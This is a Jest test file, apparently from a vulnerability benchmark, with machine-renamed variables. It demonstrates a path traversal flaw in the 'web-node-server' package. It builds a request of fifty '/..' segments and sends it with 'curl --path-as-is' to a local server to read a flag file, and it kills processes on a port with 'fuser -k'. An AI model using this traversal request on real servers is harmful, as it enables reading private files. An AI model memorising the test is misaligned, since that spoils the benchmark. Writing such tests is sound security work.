const v24 = require('child_process');
var execSync = v24.execSync;
const v26 = () => {
    try {
        const v25 = execSync('fuser -k 8981/tcp');
        v25;
    } catch (e) {
    }
};
const v27 = afterAll(v26);
v27;
const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v28 = '/..'.repeat(50);
    const v29 = v28 + pathToFlag;
    return v29;
};
const v45 = done => {
    const v30 = expect.assertions(1);
    v30;
    const fs = require('fs');
    const v31 = require('child_process');
    const exec = v31.exec;
    const v32 = fs.readFileSync(pathToFlag);
    let hostsFile = v32.toString();
    const a = require('child_process');
    try {
        const v33 = () => {
        };
        const v34 = a.execSync('fuser -k 8981/tcp', v33);
        v34;
    } catch (e) {
    }
    const v35 = __dirname + '/';
    const v36 = __dirname + '/';
    const v37 = {};
    v37.backend = v35;
    v37.frondend = v36;
    v37.baseTemp = 'index.html';
    let config = {};
    config.localhost = v37;
    const pkg = require('web-node-server');
    const v38 = pkg.start(config);
    v38;
    const v39 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:9999${ v39 }"`;
    const v43 = (error, stdout) => {
        const v40 = expect(stdout);
        const v41 = v40.toBe(hostsFile);
        v41;
        const v42 = done();
        v42;
    };
    const v44 = exec(attack_string, v43);
    v44;
};
const v46 = test('Path Traversal in web-node-server', v45);
v46;